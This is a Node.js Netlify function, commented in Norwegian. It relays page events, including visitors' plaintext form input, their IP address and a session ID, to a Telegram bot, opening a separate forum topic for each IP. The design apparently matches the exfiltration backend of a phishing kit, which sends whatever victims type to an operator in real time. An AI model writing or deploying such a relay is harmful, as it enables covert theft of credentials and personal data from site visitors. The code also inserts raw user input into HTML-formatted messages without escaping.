const crypto = require('crypto');

// Telegram Bot API konfigurasjon
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
const ipToTopicMap = new Map();

async function findExistingTopicForIP(ipAddress) {
  try {
    const topicName = `IP: ${ipAddress}`;
    let offset = 0;
    const limit = 100;
    let hasMore = true;

    while (hasMore) {
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;

      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          offset: offset,
          limit: limit,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
        return null;
      }

      const result = await response.json();

      if (result.ok && result.result && result.result.topics) {
        const existingTopic = result.result.topics.find(
          topic => topic.name === topicName
        );

        if (existingTopic) {
          console.log(`Fant eksisterende topic for IP ${ipAddress}: ${existingTopic.message_thread_id}`);
          return existingTopic.message_thread_id;
        }

        if (result.result.topics.length < limit) {
          hasMore = false;
        } else {
          offset += limit;
        }
      } else {
        hasMore = false;
      }
    }

    return null;
  } catch (error) {
    console.error(`Feil ved søk etter eksisterende topic for IP ${ipAddress}:`, error);
    return null;
  }
}

async function getOrCreateTopicForIP(ipAddress) {
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  const existingTopicId = await findExistingTopicForIP(ipAddress);
  if (existingTopicId) {
    ipToTopicMap.set(ipAddress, existingTopicId);
    return existingTopicId;
  }

  try {
    const topicId = await createTopicForIP(ipAddress);
    ipToTopicMap.set(ipAddress, topicId);
    return topicId;
  } catch (error) {
    console.error(`Kunne ikke opprette topic for IP ${ipAddress}:`, error);

    if (error.message && error.message.includes('already exists')) {
      console.log(`Topic eksisterer allerede for IP ${ipAddress}, søker på nytt...`);
      const existingTopicId2 = await findExistingTopicForIP(ipAddress);
      if (existingTopicId2) {
        ipToTopicMap.set(ipAddress, existingTopicId2);
        return existingTopicId2;
      }
    }

    return null;
  }
}

async function createTopicForIP(ipAddress) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;

  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      name: `IP: ${ipAddress}`,
      icon_color: 0x6FB9F0,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();

    if (errorData.description && errorData.description.includes('already exists')) {
      console.log(`Topic for IP ${ipAddress} eksisterer allerede, søker etter det...`);
      const existingTopicId = await findExistingTopicForIP(ipAddress);
      if (existingTopicId) {
        return existingTopicId;
      }
    }

    if (errorData.error_code === 400) {
      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
    }
    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
  }

  const result = await response.json();
  console.log(`Opprettet nytt topic for IP ${ipAddress}: ${result.result.message_thread_id}`);
  return result.result.message_thread_id;
}

async function sendToTelegram(chatId, message, topicId = null) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
  };

  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }

  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
  }

  return await response.json();
}

function formatTelegramMessage(data, isNewIPAddress = false) {
  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;

  let message = '';

  if (isNewIPAddress) {
    message += `🆕 <b>Ny bruker opprettet</b>\n`;
    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  message += `🔔 <b>Aktivitet</b>\n`;
  message += `📄 <b>Side:</b> ${page || 'Ukjent'}\n`;
  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;

  if (klartekst_input) {
    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
  }

  if (session_uid) {
    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
  }

  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;

  return message;
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ message: 'Kun POST er tillatt' }),
    };
  }

  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
    }

    const body = JSON.parse(event.body || '{}');
    const { page, event_description, klartekst_input, session_uid: client_session_uid } = body;

    // Hent IP-adresse fra headers (Netlify setter client-ip og x-forwarded-for)
    const headers = event.headers || {};
    const ip_adresse =
      (headers['client-ip']) ||
      (headers['x-forwarded-for'] ? headers['x-forwarded-for'].split(',')[0].trim() : null) ||
      headers['x-real-ip'] ||
      'Ukjent IP';

    let session_uid = client_session_uid;

    if (!session_uid) {
      session_uid = crypto.randomUUID();
      console.log('Genererte ny session_uid på serveren:', session_uid);
    } else {
      console.log('Mottok session_uid fra klienten:', session_uid);
    }

    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);

    const topicId = await getOrCreateTopicForIP(ip_adresse);

    const message = formatTelegramMessage({
      page,
      event_description,
      klartekst_input,
      ip_adresse,
      session_uid,
    }, isNewIPAddress);

    await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);

    console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);

    return {
      statusCode: 200,
      body: JSON.stringify({
        message: 'Data sendt til Telegram!',
        session_uid: session_uid,
        ip_adresse: ip_adresse,
      }),
    };
  } catch (error) {
    console.error('Telegram error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: `Serverfeil: ${error.message}` }),
    };
  }
};
